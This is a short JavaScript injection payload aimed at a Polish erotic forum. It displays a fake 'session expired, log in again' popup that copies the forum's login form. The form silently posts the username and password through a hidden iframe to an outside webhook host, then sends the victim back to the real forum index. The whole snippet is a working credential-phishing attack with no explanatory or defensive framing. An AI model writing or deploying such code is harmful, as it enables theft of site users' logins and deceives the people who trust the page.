document.getElementsByClassName("bbc_center")[0].remove()
document.title = "Sesja wygasla - FORUM EROTYCZNE GARSONIERA"
var div = document.createElement('div');
div.innerHTML = `
<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
<div id="sign_in_popup_popup" style="z-index: 10001; top: 170.75px; left: 643.5px; position: fixed;" class="popupWrapper"><div id="sign_in_popup_inner" class="popupInner" style="width: 600px; max-height: 902px;"><div id="inline_login_form" class="sb_login" style="">
		<form action="https://typedwebhook.tools/webhook/c33c8bb6-1b03-4540-b6a9-b479136a1661" target="dummyframe" method="post" id="login">
			<input type="hidden" name="auth_key" value="880ea6a14ea49e853634fbdc5015a024">
			<input type="hidden" name="referer" value="https://www.garsoniera.com.pl/forum/">
			<h3>Sesja wygasła, zaloguj się ponownie</h3>
			
			
            <div class="sb_login_row">

                <div class="sb_login_col">
                    <span class="right desc lighter blend_links"><a href="#" title="Zarejestruj się!">Zarejestruj się!</a></span>
            		<strong><label for="ips_username">Nazwa użytkownika</label></strong>
                    <div class="ipsField_content">
                    	<input id="ips_username" type="text" required class="input_text sb_login_input sb_luser" name="ips_username" placeholder="Nazwa użytkownika" size="30" tabindex="1">
                    </div>
                </div>
                
                <div class="sb_login_col">
                    <span class="right desc lighter blend_links"><a href="#" title="Odzyskaj hasło">Odzyskiwanie hasła</a></span>
                    <strong><label for="ips_password">Hasło</label></strong>
                    <div class="ipsField_content">
                        <input id="ips_password" type="password" required class="input_text sb_login_input sb_lpassword" name="ips_password" placeholder="Hasło" size="30" tabindex="2"><br>
                    </div>
                </div>
        
            </div>
            
            <div class="clearfix">
        
                <div class="sb_login_col">
                    <input type="checkbox" id="inline_remember" checked="checked" name="rememberMe" value="1" class="input_check left">
                    <div style="padding-left: 20px;">
                        <label for="inline_remember">
                            <strong>Zapamiętaj mnie</strong>
                            <span class="desc lighter" style="display: block; padding-top: 5px;">Niepolecane dla współdzielonych komputerów</span>
                        </label>
                    </div>
                </div>
    
                
                <div class="sb_login_col">
                    <input type="checkbox" id="inline_invisible" name="anonymous" value="1" class="input_check left">
                    <div style="padding-left: 20px;">
                        <label for="inline_invisible">
                            <strong>Logowanie anonimowe</strong>
                            <span class="desc lighter" style="display: block; padding-top: 5px;">Nie dodawaj mnie do listy aktywnych użytkowników</span>
                        </label>
                    </div>
                </div>
                
    
            </div>
            
            <div class="ipsForm_submit ipsForm_center clear">
                <input type="submit" class="input_submit" value="Logowanie" onclick="window.location.replace('https://www.garsoniera.com.pl/forum/index.php');">
            </div>

		</form>
	</div></div></div>
`;
document.body.appendChild(div);

var div2 = document.createElement('div');
div2.innerHTML = `<div id="document_modal" class="modal" style="width: 1903px; height: 4934px; position: fixed; top: 0px; left: 0px; z-index: 10000; opacity: 0.4;"></div>`;
document.body.appendChild(div2);
